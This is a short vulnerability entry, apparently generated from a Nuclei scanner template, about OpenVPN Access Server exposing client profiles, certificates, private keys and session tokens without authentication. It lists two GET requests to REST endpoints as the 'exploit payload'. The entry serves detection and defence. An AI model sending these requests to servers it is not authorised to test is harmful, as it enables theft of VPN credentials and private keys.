# Vulnerability: OpenVPN Access Server - Configuration Exposure
**Classification:** OPENVPN
**Source:** Nuclei Template (`openvpn-as-config-exposure.yaml`)

## Description
Detected OpenVPN Access Server with sensitive configuration data exposed, including VPN client profiles, certificates, private keys, and session tokens, without authentication.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/rest/GetUserlogin
GET {{BaseURL}}/rest/GetAutologin
```

